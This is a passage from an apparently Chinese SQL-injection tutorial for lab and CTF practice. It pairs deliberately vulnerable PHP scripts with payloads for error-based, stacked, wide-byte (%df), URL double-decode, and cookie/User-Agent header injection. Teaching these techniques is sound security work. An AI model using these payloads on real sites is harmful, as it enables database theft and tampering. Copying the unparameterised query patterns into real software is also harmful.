class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 learn</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;delete success!&#x27;</span>. <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID to delete&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM user WHERE id=$id</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=4&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>利用这个方式去注入会得到下面的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM user WHERE id=4&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>接下来的步骤就是基本注入的步骤，这里就不再赘述。</p><br><h2 id="五、堆叠注入"><a href="#五、堆叠注入" class="headerlink" title="五、堆叠注入"></a>五、堆叠注入</h2><p>堆叠注入，顾名思义就是可以堆叠很多数据库语句，换句话说就是执行多条数据库语句。实际情况下，一般只会执行一条语句，但是由于函数 mysqli_multi_query 的参与，让原本执行一条数据库语句的变为可以执行多条语句，并且以分号分隔，那么就会存在安全问题，可以利用这个性质执行恶意语句。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>) . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">// echo &#x27;Your id：&#x27;. $row[0] . &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">            <span class="comment">// echo &#x27;Your username：&#x27; .$row[1] . &#x27;&lt;hr&gt;&#x27;;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 这段代码的意思就是让数据库可以执行多条数据库语句，以分号分隔</span></span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=3&#x27;;show databases;--+</span><br></pre></td></tr></table></figure><p>利用这个方式去注入会得到下面的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=&#x27;3&#x27;;show databases;--+&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>接下来的步骤就是基本注入的步骤，，先查数据库这里可以查出其他数据库的名称，然后利用查询语句来查找想要的数据，跟联合注入不太一样的是需要注入完整的语句，都是比较基础的东西，这里就不再赘述。</p><p>有些 ctf 题会考到 alter 修改语句需要注意一下，可以去看看我的 SQL 数据库基础。</p><br><h2 id="六、二次注入"><a href="#六、二次注入" class="headerlink" title="六、二次注入"></a>六、二次注入</h2><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是 SQL 注入的一种，但是比普通 SQL 注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p><p>代码后续给出。</p><br><h2 id="七、宽字节注入"><a href="#七、宽字节注入" class="headerlink" title="七、宽字节注入"></a>七、宽字节注入</h2><p>当 mysql 数据库采用 GBK 编码时可能存在宽字节注入。</p><p>宽字节注入是利用 mysq l的一个特性，mysql 在使用 GBK 编码（ GBK 就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为<code> \&#39;</code>（在 PHP 配置文件中 magic_quotes_gpc&#x3D;On 的情况下或者使用 addslashes 函数，icov 函数，mysql_real_escape_string 函数、mysql_escape_string 函数等，提交的参数中如果带有单引号，就会被自动转义 <code>\&#39;</code>，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的 ascii 码进行组合成为一个完整的字符，此时单引号前的反斜杠就被吃了，我们就可以使用单引号了，利用这个特性从而可实施 SQL 注入的利用。最常使用的宽字节注入是利用 <code>%df</code>，其实我们只要第一个 ascii 码大于128就可以了，比如 ascii 码为129的就可以，即为 <code>%81</code>。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL宽字节注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置GBK编码</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment">// addslashes()函数，在预定义符号前添加反斜杠</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your id：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="comment">// 把传入的特殊字符转义</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%df&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/SQL-2.png" alt="SQL-2"></p><p>后续的操作就是基本步骤了，这里就不再赘述。</p><br><h2 id="八、URL-双解码注入"><a href="#八、URL-双解码注入" class="headerlink" title="八、URL 双解码注入"></a>八、URL 双解码注入</h2><p>URL 双解码注入，利用转义然后无法常规注入，然后又利用 url 解码让用户输入数据，问题就在于 urldecode 函数，不能直接注入，那么我们就可以利用 url 双解码注入，为什么要说双解码，这里不就只有一个 urldecode 函数吗？这是因为当我们在浏览器里传入数据的时候，会替我们 url 解码一次，再加上代码本身的 urldecode 解码，这就有双解码的称呼。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your id：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>利用方式（URL双编码绕过）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%2527 and 1=2--+</span><br></pre></td></tr></table></figure><p>因为 <code>%25</code> 是 <code>%</code> 的 url 编码后的结果，所以 <code>%25</code> url 解码后就是 <code>%</code>，那么 <code>%2527</code> 经过一次解码后得 <code>%27</code>，再解码一次就是 <code>&#39;</code>。</p><p>接下来就是基本操作，参考联合注入，这里不再赘述。</p><br><h2 id="九、HTTP-头注入"><a href="#九、HTTP-头注入" class="headerlink" title="九、HTTP 头注入"></a>九、HTTP 头注入</h2><p>HTTP 头注入分为很多种，像 COOKIE 注入，UA 注入，XFF 注入等，原理也很简单，像如果语言用的是 PHP 的话，那么就是利用一些魔术方法来使用参数，其利用跟上述讲的那么多种类息息相关，所以这类题千奇百怪最终还是跑不了基础。</p><h3 id="1、COOKIE-注入"><a href="#1、COOKIE-注入" class="headerlink" title="1、COOKIE 注入"></a>1、COOKIE 注入</h3><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span>)&#123;</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your id：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 利用 Cookie 传参</span></span><br></pre></td></tr></table></figure><p>利用方式同联合注入，传参是在 HTTP 头注入，可以利用 BP 抓包，也可以利用浏览器插件来修改 cookie 值，这里就不再赘述。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>id=1&#x27; and 1=1--+</span><br></pre></td></tr></table></figure><h3 id="2、UA-注入"><a href="#2、UA-注入" class="headerlink" title="2、UA 注入"></a>2、UA 注入</h3><p>核心代码只需要把上述 id 的值改为 <code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> 这个魔术方法即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure><p>利用方法类似，这里不赘述了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>1&#x27; and 1=1--+</span><br></pre></td></tr></table></figure><h3 id="3、XFF-注入"><a href="#3、XFF-注入" 